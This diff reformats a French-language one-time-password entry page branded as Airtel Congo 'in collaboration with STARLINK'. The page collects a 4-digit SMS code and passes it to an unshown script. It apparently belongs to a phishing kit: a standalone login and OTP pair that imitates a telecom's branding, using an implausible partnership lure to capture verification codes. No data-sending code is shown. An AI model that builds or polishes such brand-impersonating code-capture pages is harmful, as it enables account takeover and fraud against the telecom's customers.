@@ -1,1 +1,44 @@
-<!doctype html><html lang="fr"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Vérification OTP</title><link rel="stylesheet" href="styles.css"><link rel="stylesheet" href="login-airtel.css"><link rel="stylesheet" href="login-logo.css"><link rel="stylesheet" href="otp-airtel.css"></head><body><main class="otp-container"><header class="otp-header"><a class="back-btn" href="login.html" aria-label="Retour">←</a><img class="otp-logo" src="image.png" alt="Airtel — A reason to imagine"><button class="menu-btn" aria-label="Menu"><i class="menu-line"></i><i class="menu-line"></i><i class="menu-line"></i></button></header><section class="otp-content"><article class="otp-card"><h1 class="otp-title">Vérification OTP</h1><p class="otp-subtitle">Entrez l'OTP envoyé à votre numéro de téléphone</p><p class="otp-phone" id="phone-display">+243 951234567</p><form id="otp-form"><div class="otp-input-container"><input id="otp" class="otp-input-field" maxlength="4" inputmode="numeric" autocomplete="one-time-code" placeholder="Entrer l'OTP à 4 chiffres"><p class="otp-hint">Entrer le code de vérification à 4 chiffres</p><p class="resend-text" id="resend">Le code expire dans <span id="seconds">60</span> secondes</p></div><button id="confirm" class="submit-button" type="submit" disabled>SOUMETTRE</button></form></article></section><footer class="login-footer"><img class="footer-logo" src="image.png" alt="Airtel — A reason to imagine"><span>En collaboration avec</span><span>STARLINK™</span><p class="footer">© 2026 Airtel Congo. Tous droits réservés.</p></footer></main><script src="otp-airtel.js"></script></body></html>
+<!doctype html>
+<html lang="fr">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Vérification OTP</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="otp-airtel.css">
+</head>
+<body>
+    <main class="otp-container">
+        <header class="otp-header">
+            <a class="back-btn" href="login.html" aria-label="Retour">←</a>
+            <button class="menu-btn" aria-label="Menu">
+                <i class="menu-line"></i>
+                <i class="menu-line"></i>
+                <i class="menu-line"></i>
+            </button>
+        </header>
+        <section class="otp-content">
+            <article class="otp-card">
+                <h1 class="otp-title">Vérification OTP</h1>
+                <p class="otp-subtitle">Entrez l'OTP envoyé à votre numéro de téléphone</p>
+                <p class="otp-phone" id="phone-display"></p>
+                <form id="otp-form">
+                    <div class="otp-input-container">
+                        <input id="otp" class="otp-input-field" maxlength="4" inputmode="numeric" autocomplete="one-time-code" placeholder="Entrer l'OTP à 4 chiffres">
+                        <p class="otp-hint">Entrer le code de vérification à 4 chiffres</p>
+                        <p class="resend-text" id="resend">Le code expire dans <span id="seconds">60</span> secondes</p>
+                    </div>
+                    <button id="confirm" class="submit-button" type="submit" disabled>SOUMETTRE</button>
+                </form>
+            </article>
+        </section>
+        <footer class="login-footer">
+            <img class="footer-logo" src="image.png" alt="Airtel">
+            <span class="footer">En collaboration avec</span>
+            <span class="footer-starlink">STARLINK™</span>
+            <p class="footer-copyright">© 2026 Airtel Congo. Tous droits réservés.</p>
+        </footer>
+    </main>
+    <script src="otp-airtel.js"></script>
+</body>
+</html>
